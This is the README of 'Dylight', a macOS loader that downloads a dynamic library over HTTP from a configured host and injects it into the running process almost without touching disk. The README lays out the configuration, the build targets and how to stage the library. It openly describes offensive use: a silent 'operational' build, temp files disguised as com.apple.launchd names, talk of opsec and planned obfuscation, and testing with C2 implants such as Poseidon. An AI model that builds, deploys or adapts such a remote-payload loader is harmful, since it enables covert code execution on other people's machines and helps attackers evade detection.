# Dylight
![image](img/dylight.webp)


Dylight is a project that loads macOS dynamic libraries (dylibs) from the internet over HTTP and injects within the local process. 

It handles the dylib "almost" without touching disk, but is limited to the capabilities of `dlopen`. Read `main.c` for more information on how this is done, specifically `main.c 140-157`.

This project requires a macOS machine to compile for best results


## Configuration

The `config.env` file contains the configuration variables for the project:

```env
BINARY_NAME=loader  // Compiled binary name
HOST=192.168.1.172  // Host to connect to over HTTP
PORT=80             // HTTP port to connect to
DYLIB_PATH=/libtest.dylib // URL Subdirectory
ENTRY_POINT=RunMain // The entry point of the dylib
LC_CTYPE=c          // Makes the next part work
TMP_FILENAME=$(shell echo com.apple.launchd.$(shell tr -dc 'a-z' < /dev/urandom | head -c 1)$(shell cat /dev/urandom | tr -dc 'A-Z' | head -c 5)$(shell cat /dev/urandom | tr -dc 'a-z' | head -c 4))
                    // ^Creates a random mkstemp file in /tmp/
                    // ^^ Also changes the hash each compile

```
> [!Important]
> The server staging the dylib will be requested using the following structure: `http://$(HOST):$(PORT)$(DYLIB_PATH)

> [!WARNING]
> You MUST include all '/' in the `DYLIB_PATH` variable, including the leading. (e.g., `/api/download/libPdfManger.dylib`)

## Makefile
The Makefile includes targets for building the release version, debug version, and a test dylib:

To build the project, run the following commands:

#### Release version:
No stdout/stderr; operational mode
```make
make release
```

#### Debug version:
All stdout/stderr for testing
```make
make debug
```
> [!TIP]
> The debug version of the binary will automatically append `_debug` to the binary to avoid using in production operations.

#### Test dylib:
Compiles a demo dylib for testing purposes
```make
make test_dylib
```

## Running the compiled binary
After building the project, you can run the binary:
```bash
./<binary-name>
```

For the debug version:
```
./<binary-name>_debug
```

## Hosting the remote dylib
For development purposes, using python's `http.server` module is sufficient for staging.

Example:
```bash
curl 127.0.0.1/libtest.dylib -o libtest.dylib # This can be any method
[sudo] python3 -m http.server 80
```

## Known Issues
This project is not opsec safe for environments that use network monitoring software, as it retrieves the staged dylib over <ins>unencrypted</ins> HTTP.

It also is not *super* memory safe, due to the fact that most of your dylibs are going to be long-running ;)
It does not have a signal handler of any type, so long-running services must have a clean exit function internally.

There is also no obfuscation involved. None at all. Might do that in the future, but for now, it functions fine as-is.

## Future Goals
Here are the goals to make this project "complete":

- [ ] Integrate HTTPS
- [ ] Integrate other data streams (Websockets, etc)
- [ ] Make a memory safe exit! (sigkill)
- [ ] Obfuscation

## Additional Notes and Testing
This project works on small and large dylibs, testing from the demo included in this repo (~33K) to large C2 implants like Poseidon (9.4M). There were no issues unresolved other than requiring a clean exit from the dylib for memory issues.

Please create an issue as you see them.

## Versions

- 1.0 Initial release